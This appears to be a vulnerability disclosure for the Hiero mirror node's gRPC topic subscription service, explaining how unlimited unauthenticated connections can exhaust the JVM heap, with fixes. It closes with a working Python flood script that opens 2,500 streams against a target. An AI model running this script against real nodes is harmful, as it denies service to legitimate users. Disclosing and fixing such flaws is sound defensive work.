### Title
Unbounded Concurrent Subscription Heap Exhaustion via Unauthenticated gRPC Topic Subscriptions

### Summary
Any unauthenticated client can open an unlimited number of TCP connections to the gRPC port (5600), each carrying up to 5 concurrent `subscribeTopic` streams. Every call to `subscribeTopic()` unconditionally allocates a `TopicContext` plus a full Reactor pipeline before any admission check. There is no global cap on total subscriptions, no per-IP connection limit, and no authentication requirement, allowing a single attacker to exhaust JVM heap.

### Finding Description
**Exact code path:**

In `grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java`, `subscribeTopic()` at line 61 allocates `new TopicContext(filter)` unconditionally and eagerly — before the `topicExists()` check at line 87:

```java
// line 61 — allocation happens immediately on every call
TopicContext topicContext = new TopicContext(filter);
// ...
// line 87 — existence check is deferred inside the returned Flux
return topicExists(filter)
        .thenMany(flux.doOnNext(topicContext::onNext)
                .doOnSubscribe(s -> subscriberCount.incrementAndGet())
                ...
```

Each `TopicContext` (lines 190–197) allocates: `AtomicLong count`, `AtomicReference<TopicMessage> last`, `Stopwatch stopwatch`, `EntityId topicId`, and retains the full `TopicMessageFilter`. Beyond the `TopicContext` itself, each subscription assembles a multi-operator Reactor `Flux` chain (`historical`, `live`, `safetyCheck`, `pastEndTime`) plus a `boundedElastic` scheduler task.

**The only per-connection guard** is `maxConcurrentCallsPerConnection = 5` in `NettyProperties` (line 14), applied in `GrpcConfiguration` (line 33):

```java
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
```

This limits concurrent streams *per TCP connection* but imposes **no limit on the number of connections**. No `maxInboundConnections` is set on the `NettyServerBuilder`. The `subscriberCount` field (line 48) is a Micrometer gauge only — it is never checked against a threshold to reject new subscriptions.

**Root cause:** The server assumes that `maxConcurrentCallsPerConnection` is a sufficient DoS control, but it is a per-connection limit, not a global one. An attacker multiplies connections to bypass it.

### Impact Explanation
With N TCP connections each carrying 5 streams, the attacker holds 5N live `TopicContext` objects plus 5N Reactor pipeline chains. Each pipeline also triggers a `topicMessageRetriever.retrieve()` DB query (historical phase) and a `topicListener.listen()` subscription (live phase), compounding memory and thread pressure. At sufficient scale this causes JVM `OutOfMemoryError`, crashing the mirror node's gRPC service and denying topic subscription to all legitimate users. The gRPC service is a public-facing API endpoint with no authentication gate.

### Likelihood Explanation
The gRPC port (5600) is publicly exposed with no authentication. A single attacker machine can open thousands of TCP connections and 5 streams per connection using standard gRPC client libraries (e.g., `grpc-java`, `grpcurl`, Python `grpcio`). No special privileges, credentials, or on-chain resources are required. The attack is repeatable and scriptable.

### Recommendation
1. Add a global maximum concurrent subscription limit: check `subscriberCount` against a configurable threshold inside `subscribeTopic()` and return `RESOURCE_EXHAUSTED` if exceeded.
2. Set `serverBuilder.maxInboundConnections(N)` in `GrpcConfiguration` to cap total TCP connections.
3. Add per-IP connection rate limiting via a gRPC `ServerInterceptor`.
4. Move `TopicContext` allocation to after the `topicExists()` check so rejected requests allocate nothing.

### Proof of Concept
```python
import grpc
import threading
from concurrent.futures import ThreadPoolExecutor

# proto-generated stub for mirror node consensus service
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2

TARGET = "mirror-node-host:5600"
CONNECTIONS = 500   # 500 TCP connections
STREAMS_PER_CONN = 5  # maxConcurrentCallsPerConnection default

def flood(i):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    req = consensus_service_pb2.ConsensusTopicQuery(
        topicID=...,   # any valid topic ID
        # no limit, no end time → subscription lives forever
    )
    streams = []
    for _ in range(STREAMS_PER_CONN):
        streams.append(stub.subscribeTopic(req))
    # hold streams open; each allocates a TopicContext + Reactor pipeline
    for s in streams:
        try:
            for _ in s:
                pass
        except:
            pass

with ThreadPoolExecutor(max_workers=CONNECTIONS) as ex:
    list(ex.map(flood, range(CONNECTIONS)))
# Result: 2500 live TopicContext + Reactor pipelines → OOM on mirror node
